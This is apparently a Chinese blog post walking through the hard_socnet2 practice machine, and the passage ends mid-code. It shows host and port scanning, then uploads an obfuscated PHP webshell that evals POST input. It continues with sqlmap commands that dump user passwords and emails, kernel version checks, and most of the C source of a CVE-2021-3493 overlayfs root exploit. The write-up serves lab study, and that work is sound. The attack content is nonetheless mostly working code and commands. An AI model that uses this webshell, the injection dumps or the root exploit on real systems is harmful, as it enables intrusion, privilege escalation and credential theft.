<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">
  <meta name="google-site-verification" content="e1iwRhdDRUGkBandwtaXVgqhNwYn1qtFuAYbOSPWpcI">
  <meta name="baidu-site-verification" content="code-NObBqxefR1">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="CVE-2021-3943 | xmlrpc利用 | python升级shell | GDB | 缓冲区溢出">
<meta property="og:type" content="article">
<meta property="og:title" content="打靶练习5-hard_socnet2">
<meta property="og:url" content="http://example.com/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A05-hard-socnet2/index.html">
<meta property="og:site_name" content="ShadowFl0w">
<meta property="og:description" content="CVE-2021-3943 | xmlrpc利用 | python升级shell | GDB | 缓冲区溢出">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-11-18T01:37:58.000Z">
<meta property="article:modified_time" content="2022-11-18T01:37:58.555Z">
<meta property="article:author" content="ShadowFl0w">
<meta property="article:tag" content="打靶">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A05-hard-socnet2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>打靶练习5-hard_socnet2 | ShadowFl0w</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">ShadowFl0w</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Nothing</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A05-hard-socnet2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpeg">
      <meta itemprop="name" content="ShadowFl0w">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ShadowFl0w">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          打靶练习5-hard_socnet2
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-11-18 09:37:58" itemprop="dateCreated datePublished" datetime="2022-11-18T09:37:58+08:00">2022-11-18</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index"><span itemprop="name">红队技术</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>CVE-2021-3943 | xmlrpc利用 | python升级shell | GDB | 缓冲区溢出</p>
<span id="more"></span>

<h2 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1. 主机发现"></a>1. 主机发现</h2><h3 id="arp主机发现"><a href="#arp主机发现" class="headerlink" title="arp主机发现"></a>arp主机发现</h3><p>使用arp进行主机发现</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[root@kali ~]</span># arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: <span class="number">00</span>:0c:<span class="number">29</span>:<span class="number">03</span>:ac:<span class="number">71</span>, IPv4: <span class="number">172</span>.<span class="number">16</span>.<span class="number">42</span>.<span class="number">147</span></span><br><span class="line">Starting arp-scan <span class="number">1</span>.<span class="number">9</span>.<span class="number">7</span> with <span class="number">256</span> hosts (https://github.com/royhills/arp-scan)</span><br><span class="line"><span class="number">172.16.42.1</span>	<span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:c0:<span class="number">00</span>:<span class="number">08</span>	VMware, Inc.</span><br><span class="line"><span class="number">172.16.42.205</span>	<span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">17</span>:<span class="number">42</span>:<span class="number">82</span>	PCS Systemtechnik GmbH</span><br><span class="line"><span class="number">172.16.42.254</span>	<span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:fd:c7:e1	VMware, Inc</span><br></pre></td></tr></table></figure>

<p>明显172.16.42.205就是我们的靶机地址了。</p>
<h3 id="nmap全端口扫描"><a href="#nmap全端口扫描" class="headerlink" title="nmap全端口扫描"></a>nmap全端口扫描</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@kali ~]# <span class="keyword">nmap</span> -<span class="keyword">p</span>- <span class="number">172.16</span>.<span class="number">42.205</span></span><br><span class="line">Starting Nmap <span class="number">7.91</span> ( http<span class="variable">s:</span>//<span class="keyword">nmap</span>.org ) at <span class="number">2022</span>-<span class="number">11</span>-<span class="number">13</span> <span class="number">02</span>:<span class="number">30</span> EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">172.16</span>.<span class="number">42.205</span></span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00040</span>s latency).</span><br><span class="line">Not shown: <span class="number">65532</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">8000</span>/tcp <span class="keyword">open</span>  http-alt</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">17</span>:<span class="number">42</span>:<span class="number">82</span> (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>



<h3 id="nmap服务识别"><a href="#nmap服务识别" class="headerlink" title="nmap服务识别"></a>nmap服务识别</h3><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[root@kali ~]</span># <span class="selector-tag">nmap</span> <span class="selector-tag">-p22</span>,<span class="selector-tag">80</span>,<span class="selector-tag">8000</span> <span class="selector-tag">-sV</span> <span class="selector-tag">172</span><span class="selector-class">.16</span><span class="selector-class">.42</span><span class="selector-class">.205</span></span><br><span class="line"><span class="selector-tag">Starting</span> <span class="selector-tag">Nmap</span> <span class="selector-tag">7</span><span class="selector-class">.91</span> ( <span class="attribute">https</span>:<span class="comment">//nmap.org ) at 2022-11-13 02:32 EST</span></span><br><span class="line">Nmap scan report for <span class="number">172.16</span>.<span class="number">42.205</span></span><br><span class="line">Host is up (<span class="number">0.00042s</span> latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp   open  ssh     OpenSSH <span class="number">7.6</span>p1 Ubuntu <span class="number">4</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line"><span class="number">80</span>/tcp   open  http    Apache httpd <span class="number">2.4</span>.<span class="number">29</span> ((Ubuntu))</span><br><span class="line"><span class="number">8000</span>/tcp open  http    BaseHTTPServer <span class="number">0.3</span> (Python <span class="number">2.7</span>.<span class="number">15</span>rc1)</span><br><span class="line">MAC <span class="attribute">Address</span>: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">17</span>:<span class="number">42</span>:<span class="number">82</span> (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service <span class="attribute">Info</span>: <span class="attribute">OS</span>: Linux; <span class="attribute">CPE</span>: <span class="attribute">cpe</span>:/<span class="attribute">o</span>:<span class="attribute">linux</span>:linux_kernel</span><br></pre></td></tr></table></figure>







<h2 id="web入侵"><a href="#web入侵" class="headerlink" title="web入侵"></a>web入侵</h2><h3 id="文件上传webshell"><a href="#文件上传webshell" class="headerlink" title="文件上传webshell"></a>文件上传webshell</h3><p>访问<code>http://172.16.42.205/</code> , 注册一个账号</p>
<p>头像处上穿马获取到shell，使用的webshell <code>https://github.com/AntSwordProject/AwesomeScript/blob/master/php/php_create_function_script.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*              _   ____                       _</span></span><br><span class="line"><span class="comment">*   __ _ _ __ | |_/ ___|_      _____  _ __ __| |</span></span><br><span class="line"><span class="comment">*  / _` | &#x27;_ \| __\___ \ \ /\ / / _ \| &#x27;__/ _` |</span></span><br><span class="line"><span class="comment">* | (_| | | | | |_ ___) \ V  V / (_) | | | (_| |</span></span><br><span class="line"><span class="comment">*  \__,_|_| |_|\__|____/ \_/\_/ \___/|_|  \__,_|</span></span><br><span class="line"><span class="comment">* ———————————————————————————————————————————————</span></span><br><span class="line"><span class="comment">*     AntSword PHP Create_Function Script</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">*     警告：</span></span><br><span class="line"><span class="comment">*         此脚本仅供合法的渗透测试以及爱好者参考学习</span></span><br><span class="line"><span class="comment">*          请勿用于非法用途，否则将追究其相关责任！</span></span><br><span class="line"><span class="comment">* ———————————————————————————————————————————————</span></span><br><span class="line"><span class="comment">*  pwd = ant</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$ant</span>=create_function(<span class="string">&quot;&quot;</span>, base64_decode(<span class="string">&#x27;QGV2YWwoJF9QT1NUWyJhbnQiXSk7&#x27;</span>));</span><br><span class="line"><span class="variable">$ant</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>搜索处存在sql注入</p>
<p>抓包，保存为txt，用sqlmap跑一跑</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r <span class="selector-tag">a</span><span class="selector-class">.txt</span> -<span class="selector-tag">p</span> <span class="string">&quot;query&quot;</span></span><br></pre></td></tr></table></figure>



<p><strong>查看数据库</strong></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r <span class="selector-tag">a</span><span class="selector-class">.txt</span> -<span class="selector-tag">p</span> <span class="string">&quot;query&quot;</span> --dbs</span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[*]</span> information_schema</span><br><span class="line"><span class="selector-attr">[*]</span> mysql</span><br><span class="line"><span class="selector-attr">[*]</span> performance_schema</span><br><span class="line"><span class="selector-attr">[*]</span> socialnetwork</span><br><span class="line"><span class="selector-attr">[*]</span> sys</span><br></pre></td></tr></table></figure>



<p><strong>查看表</strong></p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r a.txt -p &quot;query&quot; -D socialnetwork --tables</span><br><span class="line"></span><br><span class="line"><span class="meta">[4 tables]</span></span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">| friendship |</span><br><span class="line">| posts      |</span><br><span class="line">| user_phone |</span><br><span class="line"><span class="section">| users      |</span></span><br><span class="line"><span class="section">+------------+</span></span><br></pre></td></tr></table></figure>



<p><strong>查看字段</strong></p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r a.txt -p <span class="string">&quot;query&quot;</span> -D socialnetwork -T users --columns</span><br><span class="line"></span><br><span class="line">+----------------+--------------+</span><br><span class="line">|<span class="string"> Column         </span>|<span class="string"> Type         </span>|</span><br><span class="line">+----------------+--------------+</span><br><span class="line">|<span class="string"> user_about     </span>|<span class="string"> text         </span>|</span><br><span class="line">|<span class="string"> user_birthdate </span>|<span class="string"> date         </span>|</span><br><span class="line">|<span class="string"> user_email     </span>|<span class="string"> varchar(255) </span>|</span><br><span class="line">|<span class="string"> user_firstname </span>|<span class="string"> varchar(20)  </span>|</span><br><span class="line">|<span class="string"> user_gender    </span>|<span class="string"> char(1)      </span>|</span><br><span class="line">|<span class="string"> user_hometown  </span>|<span class="string"> varchar(255) </span>|</span><br><span class="line">|<span class="string"> user_id        </span>|<span class="string"> int(11)      </span>|</span><br><span class="line">|<span class="string"> user_lastname  </span>|<span class="string"> varchar(20)  </span>|</span><br><span class="line">|<span class="string"> user_nickname  </span>|<span class="string"> varchar(20)  </span>|</span><br><span class="line">|<span class="string"> user_password  </span>|<span class="string"> varchar(255) </span>|</span><br><span class="line">|<span class="string"> user_status    </span>|<span class="string"> char(1)      </span>|</span><br><span class="line">+----------------+--------------+</span><br></pre></td></tr></table></figure>



<p><strong>查看字段内容</strong></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r <span class="selector-tag">a</span><span class="selector-class">.txt</span> -<span class="selector-tag">p</span> <span class="string">&quot;query&quot;</span> -D socialnetwork -T users -C <span class="string">&quot;user_password, user_email&quot;</span> --dump</span><br></pre></td></tr></table></figure>









<h2 id="CVE-2021-3493提权"><a href="#CVE-2021-3493提权" class="headerlink" title="CVE-2021-3493提权"></a>CVE-2021-3493提权</h2><p>查看内核版本</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(www-data:<span class="regexp">/var/</span>www<span class="regexp">/html/</span>data<span class="regexp">/images/</span>posts) $ uname -a</span><br><span class="line">Linux socnet2 <span class="number">4.15</span>.<span class="number">0</span>-<span class="number">38</span>-generic <span class="comment">#41-Ubuntu SMP Wed Oct 10 10:59:38 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>



<p>查看系统版本</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(www-data:<span class="regexp">/var/</span>www<span class="regexp">/html/</span>data<span class="regexp">/images/</span>posts) $ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:    Ubuntu</span><br><span class="line"><span class="keyword">Description</span>:    Ubuntu <span class="number">18.04</span>.<span class="number">1</span> LTS</span><br><span class="line">Release:    <span class="number">18.04</span></span><br><span class="line">Codename:    bionic</span><br></pre></td></tr></table></figure>



<h3 id="CVE-2021-3493"><a href="#CVE-2021-3493" class="headerlink" title="CVE-2021-3493"></a>CVE-2021-3493</h3><p><strong>Affected Versions</strong></p>
<ul>
<li>Ubuntu 20.10</li>
<li>Ubuntu 20.04 LTS</li>
<li>Ubuntu 19.04</li>
<li>Ubuntu 18.04 LTS</li>
<li>Ubuntu 16.04 LTS</li>
<li>Ubuntu 14.04 ESM</li>
</ul>
<p>可以看见18.04是存在cve-2021-3493的</p>
<p>漏洞利用代码：<a target="_blank" rel="noopener" href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p>
<ul>
<li>exploit.c</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//#include &lt;attr/xattr.h&gt;</span></span><br><span class="line"><span class="comment">//#include &lt;sys/xattr.h&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setxattr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">const</span> <span class="keyword">void</span> *value, <span class="keyword">size_t</span> size, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIR_BASE    <span class="meta-string">&quot;./ovlcap&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIR_WORK    DIR_BASE <span class="meta-string">&quot;/work&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIR_LOWER   DIR_BASE <span class="meta-string">&quot;/lower&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIR_UPPER   DIR_BASE <span class="meta-string">&quot;/upper&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIR_MERGE   DIR_BASE <span class="meta-string">&quot;/merge&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BIN_MERGE   DIR_MERGE <span class="meta-string">&quot;/magic&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BIN_UPPER   DIR_UPPER <span class="meta-string">&quot;/magic&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">xmkdir</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">mode_t</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mkdir(path, mode) == <span class="number">-1</span> &amp;&amp; errno != EEXIST)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mkdir %s&quot;</span>, path);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">xwritefile</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">const</span> <span class="keyword">char</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(path, O_WRONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;open %s&quot;</span>, path);</span><br><span class="line">    <span class="keyword">ssize_t</span> len = (<span class="keyword">ssize_t</span>) <span class="built_in">strlen</span>(data);</span><br><span class="line">    <span class="keyword">if</span> (write(fd, data, len) != len)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;write %s&quot;</span>, path);</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">xcopyfile</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *src, <span class="keyword">const</span> <span class="keyword">char</span> *dst, <span class="keyword">mode_t</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fi, fo;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((fi = open(src, O_RDONLY)) == <span class="number">-1</span>)</span><br><span class="line">        err(<span 